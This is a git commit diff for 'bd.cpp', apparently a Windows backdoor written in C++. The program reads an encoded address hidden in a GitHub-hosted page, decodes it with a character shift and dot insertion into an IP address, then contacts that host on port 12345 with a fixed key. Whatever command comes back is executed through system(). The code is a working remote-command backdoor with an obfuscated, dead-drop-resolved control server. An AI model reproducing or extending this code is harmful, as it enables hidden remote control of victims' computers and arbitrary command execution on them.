ceb51ab6928eb010cd96e513c991621b0b4d2561
amagicman123456 <prof.ryupedia@gmail.com>
2025-02-11 19:52:00 -0800

    new bd

--- bd.cpp
+++ bd.cpp
@@ -1,21 +1,25 @@
+//
+// Created by 6rco360 on 2/11/2025.
+//
 // Created on 2/11/2025.
 #include <windows.h>
 #include <WinInet.h>
 #include <iostream>
 #include <cstdlib>
+#include <regex>
 //link with -lwininet
-std::string send_request(const char* server, const char* page, const char *verb = "GET", const char *payload = 0){
+std::string send_request(const char* server, const char* page, int port = INTERNET_DEFAULT_HTTPS_PORT, const char *verb = "GET", const char *payload = 0){
     std::string result;
-    HINTERNET internet, connect, request;
+    HINTERNET internet = 0, connect = 0, request = 0;
     if(!(internet = InternetOpen("WinInet Test", INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0)) ||
-       !(connect = InternetConnect(internet, server, 12345, 0, 0, INTERNET_SERVICE_HTTP, 0, 1)) ||
+       !(connect = InternetConnect(internet, server, port, 0, 0, INTERNET_SERVICE_HTTP, 0, 1)) ||
        !(request = HttpOpenRequest(connect, verb, page, 0, 0, 0, INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_SECURE, 1))) {
-        InternetCloseHandle(request);
-        InternetCloseHandle(connect);
         InternetCloseHandle(internet);
+        InternetCloseHandle(connect);
+        InternetCloseHandle(request);
         return "";
-    }
-    bool s = HttpSendRequest(request, 0, 0, payload, 0);
+       }
+    bool s = HttpSendRequest(request, 0, 0, (void*)payload, 0);
     char data[10000];
     while(s) {
         DWORD bytes;
@@ -26,19 +30,27 @@ std::string send_request(const char* server, const char* page, const char *verb 
     }
     return result;
 }
-std::string ify(const std::string& s) {
-    std::string result;
-    int count = 0;
-    for (char c : s) {
-        result += c;
-        if (!(count++ % 3) && (count < s.length()))
-            result += '.';
-    }
-    return result;
+std::string ify(std::string s) {
+    s.insert(s.begin() + 2, '.');
+    s.insert(s.begin() + 5, '.');
+    s.insert(s.begin() + 8, '.');
+    return s;
 }
 int main(){
-    std::string s = send_request("amagicman123456.github.io", "/bd/")
-    for (char& i : s) i -= 97;
-    system(send_request(ify(s), "/", "POST", "ADSOFU1S"));
+    std::string s = send_request("github.com", "/amagicman123456/bd/blob/main/index.html");
+    std::regex r(R"(\"rawLines\"\:\[\"(.+?)\")");
+    std::cout << "s: " << s << std::endl;
+
+    std::smatch sm;
+    std::regex_search(s, sm, r);
+    std::string str = sm[1].str();
+    std::cout << "str: " << str << std::endl;
+    for (char& i : str) i -= 49;
+    std::string ified = ify(str);
+    std::cout << "ified: " << ified << '\n';
+
+    std::string cmd = send_request(ified.c_str(), "/", 12345, "POST", "ADSOFU1S");
+    std::cout << "Command: " << cmd << '\n';
+    system(cmd.c_str());
     return 0;
 }
